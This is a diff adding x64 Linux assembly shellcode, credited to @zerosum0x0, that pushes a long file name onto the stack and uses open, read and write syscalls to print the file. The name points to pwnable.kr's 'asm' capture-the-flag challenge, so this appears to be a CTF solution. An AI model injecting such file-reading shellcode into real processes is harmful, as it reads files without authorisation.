@@ -1,0 +1,137 @@
+; credit to @zerosum0x0  -  (https://zerosum0x0.blogspot.com/2014/12/x64-linux-polymorphic-read-file.html)
+
+
+_start:
+ 
+filename:
+    xor esi, esi
+    mul esi
+
+    push rdx    ; '\0'
+	
+	
+	; file's name = .////////this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
+	
+	mov rcx, 0x676e6f306f306f30  
+    push rcx
+
+    mov rcx, 0x6f306f306f306f30    
+    push rcx
+	
+	mov rcx, 0x3030303030303030   
+    push rcx
+	
+	mov rcx, 0x3030306f6f6f6f6f   
+    push rcx
+	
+	mov rcx, 0x6f6f6f6f6f6f6f6f   
+    push rcx
+	
+	mov rcx, 0x6f6f6f6f6f6f6f6f   
+    push rcx
+	
+	mov rcx, 0x6f6f303030303030   
+    push rcx
+	
+	mov rcx, 0x3030303030303030   
+    push rcx
+	
+	mov rcx, 0x3030303030303030   
+    push rcx
+	
+	mov rcx, 0x3030306f6f6f6f6f   
+    push rcx
+	
+	mov rcx, 0x6f6f6f6f6f6f6f6f   
+    push rcx
+	
+	mov rcx, 0x6f6f6f6f6f6f6f6f   
+    push rcx
+	
+	mov rcx, 0x6f6f6f6f6f6f6f6f   
+    push rcx
+	
+	mov rcx, 0x6f6f6f6f6f6f6f6f   
+    push rcx
+	
+	mov rcx, 0x6f6f6f6f6f6f6f6f   
+    push rcx
+	
+	mov rcx, 0x6f6f6f6f6f6f6f6f   
+    push rcx
+	
+	mov rcx, 0x6f6f6f6f6f6f6f6f   
+    push rcx
+	
+	mov rcx, 0x6f6f6f6f6f6f6f6f   
+    push rcx
+	
+	mov rcx, 0x6f6f6f6f6f6f6f6c   
+    push rcx
+	
+	mov rcx, 0x5f797265765f7369   
+    push rcx
+	
+	mov rcx, 0x5f656d616e5f656c   
+    push rcx
+	
+	mov rcx, 0x69665f6568745f79   
+    push rcx
+	
+	mov rcx, 0x72726f732e656c69   
+    push rcx
+	
+	mov rcx, 0x665f736968745f64   
+    push rcx
+	
+	mov rcx, 0x6165725f65736165   
+    push rcx
+	
+	mov rcx, 0x6c705f656c69665f   
+    push rcx
+	
+	mov rcx, 0x67616c665f726b2e   
+    push rcx
+	
+	mov rcx, 0x656c62616e77705f   
+    push rcx
+	
+	mov rcx, 0x73695f736968742f  
+    push rcx
+	
+    mov rcx, 0x2f2f2f2f2f2f2f2e
+    push rcx
+	
+
+openfile:
+    push rsp
+    pop rdi
+
+    mov al, 0x2
+    syscall
+
+readfile:
+    push rax
+    pop rdi
+
+    push rsp
+
+    pop rsi
+
+    push rdx
+    push rdx        ; saving lots of 0's (to use the stack for resetting registers rather than mov reg, 0)
+    push rdx
+    push rdx
+    pop rax
+    mov dx, 0x999   ; read 0x999 bytes from the file (size)
+    syscall
+
+write:
+    pop rdi
+    inc edi
+    
+    push rax
+    pop rdx
+    pop rax
+    inc eax
+    syscall
